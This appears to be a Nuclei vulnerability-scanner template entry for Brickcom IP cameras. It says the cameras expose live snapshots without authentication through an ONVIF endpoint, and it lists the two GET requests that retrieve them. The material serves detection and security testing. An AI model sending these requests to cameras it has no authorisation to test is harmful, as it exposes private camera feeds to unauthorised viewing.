# Nuclei Template: Brickcom Camera - Unauthenticated Snapshot Access
**Template ID:** brickcom-camera-unauth-snapshot
**Vulnerability Class:** Use of Default Credentials
**Severity:** High
**Source:** Nuclei Template (`brickcom-camera-unauth-snapshot.yaml`)

## Vulnerability Information & PoC

## Description
Detected Brickcom IP cameras was exposed live camera snapshots without authentication via the ONVIF media endpoint.

## Steps to reproduce / Exploit Payload
```http
GET {{BaseURL}}/ONVIF/media.cgi?action=getSnapshot
GET {{BaseURL}}/ONVIF/media.cgi?action=getSnapshot&channel=1
```

## References
- https://cxsecurity.com/issue/WLB-2026020031
